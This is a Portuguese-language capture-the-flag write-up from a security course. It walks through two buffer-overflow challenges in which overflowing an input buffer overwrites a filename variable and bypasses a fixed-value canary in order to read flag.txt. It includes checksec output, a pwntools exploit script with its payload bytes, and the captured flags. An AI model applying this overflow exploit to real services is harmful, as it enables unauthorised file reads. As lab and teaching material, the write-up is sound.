# CTF 5

## Desafio #1

### checksec

```
[11/14/21]seed@VM:~/ctf5$ checksec program
[*] '/home/seed/ctf5/program'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

### Existe algum ficheiro que é aberto e lido pelo programa?

O file `mem.txt` é aberto para leiture no programa.

### Existe alguma forma de controlar o ficheiro que é aberto?

O ficheiro nao é criado pelo programa entao podemos alterar o target file.

Existe um buffer overflow que nos deixa escrever por cima da variável que tem
contem o nome do ficheiro.

### Existe algum buffer-overflow? Se sim, o que é que podes fazer?

A leitura para o char array `buffer` aceita até 28 chars mas o buffer tem 20 =>
possível fazer overflow.

### Abusar buffer-overflow para ler outro ficheiro

```
[11/14/21]seed@VM:~/ctf5$ python3 exploit-example.py
[+] Opening connection to ctf-fsi.fe.up.pt on port 4003: Done
[*] Switching to interactive mode
Echo 12345678901234567890flag.txt
I like what you got!
flag{6c9951e09608d5fcac88f83fa45e9f48}
[*] Got EOF while reading in interactive
$
[*] Closed connection to ctf-fsi.fe.up.pt port 4003
[11/14/21]seed@VM:~/ctf5$
```

### Flag 1

`flag{6c9951e09608d5fcac88f83fa45e9f48}`

## Desafio #2

### checksec

```
[11/14/21]seed@VM:~/.../challenge2$ checksec program
[*] '/home/seed/ctf5/challenge2/program'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Mesmas permissoes.

### Que alterações foram feitas?

- Aumentaram o tamanho de chars lidos.
- Adicionaram um char array `val` que serve como uma especie de canary.

### Mitigam na totalidade o problema?

- Nao porque sabemos o que temos de escrever no array `val` para pasar o match.
- Continuamos a conseguir escrever sobre a variavel que contem o nome do
  ficheiro.

### É possivel ultrapassar a mitigação usando uma técnica similar à que foi utilizada anteriormente?

Sim.

### Script adapatado

```py
#!/usr/bin/env python3

from pwn import *
from sys import argv

DEBUG = False
if len(argv) > 1 and argv[1].lower() == "debug":
    DEBUG = True

local = './program'
url = 'ctf-fsi.fe.up.pt'
port = 4000
if DEBUG:
    r = process(local)
else:
    r = remote(url, port)

r.recvuntil(b":")
val = b"\x22\x21\xfc\xfe"
r.sendline(b"12345678901234567890" + val + b"flag.txt")
r.interactive()
```

### Flag 2

```
[11/14/21]seed@VM:~/.../challenge2$ ./exploit-example.py
[+] Opening connection to ctf-fsi.fe.up.pt on port 4000: Done
[*] Switching to interactive mode
I like what you got!
flag{4d4e6828b75144df352646b19f22a123}
[*] Got EOF while reading in interactive
$  
```
